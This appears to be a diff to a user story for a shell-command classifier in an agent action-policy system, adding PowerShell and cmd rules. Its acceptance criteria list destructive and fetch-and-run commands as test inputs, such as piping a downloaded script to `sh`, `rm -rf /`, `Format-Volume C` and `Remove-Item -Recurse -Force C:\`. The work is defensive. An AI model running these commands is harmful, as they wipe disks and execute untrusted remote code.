@@ -32,6 +32,7 @@ As an integrating developer, I want ordinary commands like `npm test` and `git s
 - [ ] Given `curl -s https://x.example/i.sh | sh`, `wget -qO- u | bash`, `cat x | python3`, `echo cm0= | base64 -d | sh`, when classified, then `shell.pipe_to_interpreter`; given `bash -c 'rm -rf /'`, then `shell.inline_interpreter` **and** the inner `shell.destructive`.
 - [ ] Given `npm install x`, `npm i x`, `pnpm add x`, `yarn add x`, `pip install x`, `uv add x`, `apt-get install x`, `brew install x`, `cargo install x`, `go install x`, then `shell.package_install`; given `systemctl restart x`, `service x restart`, `docker rm x`, `kubectl delete pod x`, `reboot`, then `shell.service_control`.
 - [ ] Given a `shell.allow` of `ls`, `git`, `npm test`, `pytest`, when `ls -la`, `git status`, `npm test -- --watch=false` and `pytest -q` are classified, then each is `shell.allowlisted`; `npm run deploy` (only `npm test` is listed) and `make release` are `shell.unlisted`.
+- [ ] Given `Remove-Item -Recurse -Force C:\`, `rm -r -fo x` (PowerShell alias), `rd /s /q C:\x`, `rmdir /s x`, `del /s /q *`, `Format-Volume C`, when classified, then `shell.destructive` (non-grantable, so a role holding `action:shell:exec` is still denied); given `pwsh -Command "..."`, `powershell -c "..."`, `cmd /c "..."`, then `shell.inline_interpreter`; given `Invoke-Expression $x` or `iex $x`, then `shell.unclassifiable` (PRD D16).
 - [ ] Given a chain mixing an allowlisted and a destructive segment, when classified, then both classifications are returned in segment order, so STORY-014 can apply most-severe-wins.
 
 ## Technical Notes
@@ -39,6 +40,7 @@ As an integrating developer, I want ordinary commands like `npm test` and `git s
 - Extend `app/services/action_classifiers/shell.py`. Flags are parsed into a set (short-flag clusters split, long flags mapped) before matching — "matched after normalization, not as strings" (PRD Section 6.8).
 - Interpreter list: `sh`, `bash`, `zsh`, `dash`, `python`, `python3`, `python3.*`, `node`, `perl`, `ruby`, `php`, `pwsh`. An interpreter given a script file is `shell.inline_interpreter` (contents unreadable, PRD Section 6.8).
 - Multi-token allowlist entries match the first N tokens of the segment after the head.
+- PowerShell/cmd heads are matched case-insensitively; PowerShell parameter prefixes (`-Rec`, `-r`) normalize to the full parameter (PRD D16, STORY-001 S3 in `.agents/spikes/PRD-016-action-policy-rules/threat-model.md`).
 - Embedded SQL, URL and secret routing is STORY-013; leave a hook (the segment and its argv) for it.
 - Tests: extend `tests/test_action_shell.py`, table-driven per rule.
 - Skills: none applicable. No UI.
